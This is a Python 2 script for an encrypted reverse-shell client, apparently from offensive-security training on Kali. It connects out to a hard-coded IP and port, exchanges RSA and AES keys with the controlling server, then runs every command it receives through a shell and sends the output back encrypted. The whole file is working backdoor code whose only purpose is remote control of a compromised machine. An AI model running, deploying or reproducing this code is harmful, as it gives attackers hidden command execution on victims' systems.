# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

import socket                    
import subprocess                 

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES



def decryptAESKey(encrypted_aes_key, client_RSA_private_key):
    decryptor = RSA.importKey(client_RSA_private_key)
    aes_key = decryptor.decrypt(encrypted_aes_key)   
    return aes_key


def encrypt(message, aes_key, counter):
    encrypto = AES.new(aes_key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message, aes_key, counter):
    decrypto = AES.new(aes_key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message) 



def connect():

    # do client RSA key stuff
    new_key = RSA.generate(4096 ) # generate  RSA key that 4096 bits long
	
    # export the keys in PEM format, the PEM extension contains ASCII encoding
    client_RSA_public_key = new_key.publickey().exportKey("PEM")
    client_RSA_private_key = new_key.exportKey("PEM")

    print 'created RSA keys'
    print client_RSA_public_key
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # to prevent "socket.error: [Errno 98] Address already in use" (socket is in a TIME_WAIT state)
    # we set a flag to prevent this
    # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)	
    s.connect(('192.168.100.187', 8080))

    # send client RSA public key to server - server will create AES key and send it encrypted (with client public key) back to client
    s.send(client_RSA_public_key)	

	
    # do AES encryption stuff
    # receive encrypted AES key -> decrypt with RSA private key
    recv_encrypted_aes_key = s.recv(1024)
    aes_key = decryptAESKey(recv_encrypted_aes_key, client_RSA_private_key)

    # receive encrypted AES counter -> decrypt with RSA private key
    recv_encrypted_aes_counter = s.recv(1024)
    aes_counter = decryptAESKey(recv_encrypted_aes_counter, client_RSA_private_key)
 
    while True:                                                 
        command = decrypt(s.recv(1024), aes_key, aes_counter)
        print ' We received: ' +  command
        
        if 'terminate' in command:                 
            s.close()
            break 
        
        else:                                                 
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(encrypt(CMD.stdout.read(), aes_key, aes_counter))
            s.send(encrypt(CMD.stderr.read(), aes_key, aes_counter))

def main ():
    connect()
main()











